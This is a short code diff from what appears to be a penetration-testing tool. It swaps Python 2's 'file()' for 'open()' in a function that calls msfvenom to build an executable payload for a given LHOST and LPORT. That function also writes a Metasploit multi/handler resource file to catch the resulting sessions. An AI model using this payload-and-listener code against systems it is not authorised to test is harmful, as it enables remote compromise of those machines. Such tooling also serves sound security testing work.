@@ -18,7 +18,7 @@ def payload_generate(payload, lhost, port):
     subprocess.Popen(meta_path + "msfvenom -p %s LHOST=%s LPORT=%s --format=exe > %s/payload.exe" %
                      (payload, lhost, port, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
     # write out the rc file
-    filewrite = file(setdir + "/meta_config", "w")
+    filewrite = open(setdir + "/meta_config", "w")
     filewrite.write(
         "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (payload, lhost, port))
     filewrite.close()
